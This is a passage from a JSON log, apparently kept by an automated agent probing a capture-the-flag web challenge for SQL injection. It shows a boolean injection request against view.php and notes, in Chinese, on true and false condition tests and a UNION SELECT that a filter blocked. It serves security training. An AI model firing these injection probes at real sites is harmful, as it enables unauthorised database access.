src='data:text/html;base64,PCFkb2N0eXBlIGh0bWw+PGh0bWwgbGFuZz0iZW4iPjxoZWFkPjx0aXRsZT5FeGFtcGxlIERvbWFpbjwvdGl0bGU+PG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xIj48c3R5bGU+Ym9keXtiYWNrZ3JvdW5kOiNlZWU7d2lkdGg6NjB2dzttYXJnaW46MTV2aCBhdXRvO2ZvbnQtZmFtaWx5OnN5c3RlbS11aSxzYW5zLXNlcmlmfWgxe2ZvbnQtc2l6ZToxLjVlbX1kaXZ7b3BhY2l0eTowLjh9YTpsaW5rLGE6dmlzaXRlZHtjb2xvcjojMzQ4fTwvc3R5bGU+PC9oZWFkPjxib2R5PjxkaXY+PGgxPkV4YW1wbGUgRG9tYWluPC9oMT48cD5UaGlzIGRvbWFpbiBpcyBmb3IgdXNlIGluIGRvY3VtZW50YXRpb24gZXhhbXBsZXMgd2l0aG91dCBuZWVkaW5nIHBlcm1pc3Npb24uIEF2b2lkIHVzZSBpbiBvcGVyYXRpb25zLjwvcD48cD48YSBocmVmPSJodHRwczovL2lhbmEub3JnL2RvbWFpbnMvZXhhbXBsZSI+TGVhcm4gbW9yZTwvYT48L3A+PC9kaXY+PC9ib2R5PjwvaHRtbD4K'>\r\n</div>\r\n</body>\r\n</html>",
+          "stderr": "",
+          "exit_code": 0,
+          "command": "http_request {\"url\": \"http://node4.anna.nssctf.cn:24052/view.php?no=1%20and%20substr('abc',1,1)='a'\", \"method\": \"GET\", \"timeout\": 10}",
+          "script_path": "",
+          "source": "strategy:3.11s",
+          "failure_stage": ""
+        }
+      }
+    },
+    "observed_task_results": [
+      {
+        "task_id": "test_between_false",
+        "target": "测试条件假(false)",
+        "result": "返回PHP notice和Fatal error，无用户数据",
+        "key_findings": "条件假时查询结果为空，调用getBlogContents() on boolean"
+      },
+      {
+        "task_id": "test_between_true",
+        "target": "测试条件真(true)",
+        "result": "返回testuser123的完整信息",
+        "key_findings": "条件真时正常显示用户数据"
+      },
+      {
+        "task_id": "test_no_1",
+        "target": "正常参数no=1",
+        "result": "显示testuser123",
+        "key_findings": "正常访问有效"
+      },
+      {
+        "task_id": "test_no_2",
+        "target": "正常参数no=2",
+        "result": "显示attacker123",
+        "key_findings": "不同用户数据"
+      },
+      {
+        "task_id": "test_no_math",
+        "target": "算术运算2-1",
+        "result": "显示testuser123",
+        "key_findings": "算术运算可用"
+      },
+      {
+        "task_id": "test_union_basic",
+        "target": "UNION SELECT测试",
+        "result": "返回'no hack ~_~'",
+        "key_findings": "WAF拦截UNION SELECT关键字组合"
+      }
+    ],
+    "artifacts": [],
+    "code_evidence": []
+  }
+}
